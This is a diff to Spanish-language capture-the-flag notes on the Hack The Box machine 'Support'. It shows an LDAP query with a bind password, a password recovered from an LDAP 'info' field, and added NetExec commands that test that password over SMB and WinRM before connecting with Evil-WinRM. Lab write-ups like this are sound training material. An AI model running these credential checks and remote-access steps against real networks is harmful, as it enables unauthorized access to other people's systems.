@@ -219,8 +219,18 @@ ldapsearch -x -H ldap://10.129.230.181 -D 'ldap@support.htb' -w 'nvEfEK16^1aM4$e
 ```
 
 Encontrando un campo llamado `info` en el cual hay un valor semejante a una contraseña 
-```add-hint
+```ad-hint
 Ironside47pleasure40Watchful
 ```
 
+La validamos con [[NETEXEC]] tomándola como valida
+```shell
+nxc smb 10.129.230.181 -u 'support' -p 'Ironside47pleasure40Watchful'
+```
 
+Verificamos si el usuario pertenece al grupo de `Remote Management Users` usando la herramienta [[NETEXEC]]
+```shell
+nxc winrm 10.129.230.181 -u 'support' -p 'Ironside47pleasure40Watchful'
+```
+
+Viendo que si pertenece y pudiéndonos conectar al usuario usando la herramienta [[EVIL-WINRM]]
